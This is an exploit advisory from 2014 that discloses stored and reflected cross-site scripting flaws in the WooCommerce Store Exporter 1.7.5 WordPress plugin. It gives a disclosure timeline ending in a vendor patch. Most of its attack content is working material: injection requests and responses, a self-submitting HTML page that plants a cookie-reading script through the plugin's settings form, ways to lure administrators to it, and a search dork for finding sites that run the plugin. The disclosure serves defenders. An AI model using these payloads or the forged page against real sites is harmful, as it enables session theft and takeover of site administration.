@@ -1,0 +1,116 @@
+# Exploit Title: WooCommerce Store Exporter v1.7.5 Stored XSS
+# Google Dork: inurl:"woocommerce-exporter"
+# Date: 26/08/2014
+# Exploit Author: Mike Manzotti @ Dionach
+# Vendor Homepage: http://www.visser.com.au/plugins/store-exporter/
+# Software Link: http://downloads.wordpress.org/plugin/woocommerce-exporter.zip  (Fixed)
+# Version: v1.7.5
+
+# Vulnerability Disclosure Timeline:
+2014-08-25:  Discovered vulnerability
+2014-08-25:  Vendor Notification
+2014-08-25:  Vendor Response/Feedback
+2014-08-26:  Vendor Fix/Patch (v 1.7.6)
+2014-08-26:  Public Disclosure
+
+Stored Cross Site Scripting
+
+URL
+
+FIELDS
+
+/wp-admin/admin.php?page=woo_ce&tab=export
+
+POST: export_filename
+
+
+POST http://192.168.71.133/wp/wp-admin/admin.php?page=woo_ce&tab=settings
+export_filename="</script><script>alert(document.cookie)</script>&delete_file=0&encoding=UTF-8&timeout=0&delimiter=%2C&category_separator=%7C&bom=1&escape_formatting=all&enable_auto=0&auto_type=products&order_filter_status=&auto_method=archive&enable_cron=0&submit=Save+Changes&action=save-settings
+
+Response:
+<input name="export_filename" type="text" id="export_filename" value="\"</script><script>alert(document.cookie)</script>"
+
+[cid:image005.jpg@01CFC090.5AED79D0]
+
+Scenario:
+An attacker creates a malicious page as shown below and uploads it on a server under attacker's control.
+
+<html>
+<head>
+<title>XSS WooCommerce - Store Exporter</title>
+</head>
+<body onload="javascript:document.forms[0].submit()">
+<form method="POST" name="1" action="http://192.168.71.133/wp/wp-admin/admin.php?page=woo_ce&tab=settings">
+<input type="hidden" name="export_filename" value='"</script><script>alert(document.cookie)</script>"'/>
+<input type="hidden" name="action" value="save-settings"/>
+</form>
+</body>
+</html>
+
+When a WordPress administrator visits the malicious page above, a JavaScript code which prompts administrator's cookies will be saved on the victim's website. The attacker could send the URL pointing to the malicious webpage in an email or posting it in a review of a WooCommerce product, as shown below:
+
+[cid:image012.jpg@01CFC090.5AED79D0]
+
+When the WordPress administrator clicks on the malicious URL...
+
+[cid:image013.jpg@01CFC090.5AED79D0]
+
+The JavaScript code will be executed and saved in Store Exporter Settings:
+
+http://192.168.71.133/wp/wp-admin/admin.php?page=woo_ce&tab=settings
+[cid:image014.jpg@01CFC090.5AED79D0]
+
+Reflected Cross Site Scripting
+
+URL
+
+FIELDS
+
+/wp-admin/admin.php?page=woo_ce&tab=export
+
+GET: tab, POST: dataset
+
+
+1) Example
+Request:
+http://192.168.71.133/wp/wp-admin/admin.php?page=woo_ce&tab=<script>alert(1)</script<http://192.168.71.133/wp/wp-admin/admin.php?page=woo_ce&tab=%3cscript%3ealert(1)%3c/script>>
+
+Response:
+[...]
+<code>tabs-export<script>alert(1)</script>c172f.php</code>
+[...]
+
+http://192.168.71.133/wp/wp-admin/admin.php?page=woo_ce&tab=<script>alert(document.cookie)</script<http://192.168.71.133/wp/wp-admin/admin.php?page=woo_ce&tab=%3cscript%3ealert(document.cookie)%3c/script>>
+[cid:image015.jpg@01CFC090.5AED79D0]
+
+http://192.168.71.133/wp/wp-admin/admin.php?page=woo_ce&tab=settings
+
+2) Example
+Request:
+POST http://192.168.71.133/wp/wp-admin/admin.php?page=woo_ce&tab=export
+dataset=users1be3c<script>alert(1)<%2fscript>87acc&product_fields_order%5Bparent_id%5D=&product_fields_order%5Bparent_sku%5D=&product_fields_order%5Bproduct_id%5D=&product_fields_order%5Bsku%5D=&product_field
+
+Response:
+[...]
+<h3>Export Details: export_users1be3c<script>alert(1)</script>
+[...]
+
+Scenario:
+Similar scenarios could be reproduced as shown in the Stored Cross-site Scripting scenario.
+
+Kind regards,
+Mike
+
+______________________________________________________________________
+
+Disclaimer: This e-mail and any attachments are confidential.
+
+It may contain privileged information and is intended for the named
+addressee(s) only. It must not be distributed without Dionach Ltd consent.
+If you are not the intended recipient, please notify the sender immediately and destroy this e-mail. 
+
+Any unauthorised copying, disclosure or distribution of the material in this e-mail is strictly forbidden. Unless expressly stated, opinions in this e-mail are those of the individual sender, and not of Dionach Ltd.
+
+Dionach Ltd, Greenford House, London Road, Wheatley, Oxford OX33 1JH Company Registration No. 03908168, VAT No. GB750661242
+
+______________________________________________________________________
